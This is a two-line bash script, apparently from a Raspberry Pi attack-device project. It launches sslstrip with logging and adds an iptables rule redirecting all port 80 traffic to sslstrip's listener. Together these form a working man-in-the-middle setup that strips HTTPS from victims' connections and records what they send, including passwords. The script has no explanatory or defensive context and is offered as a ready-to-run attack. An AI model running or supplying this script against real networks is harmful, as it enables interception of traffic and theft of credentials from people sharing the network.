#! /bin/bash

sslstrip -a -f -w /rasberryPwnPi/logPi/sslstrip.log &
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000



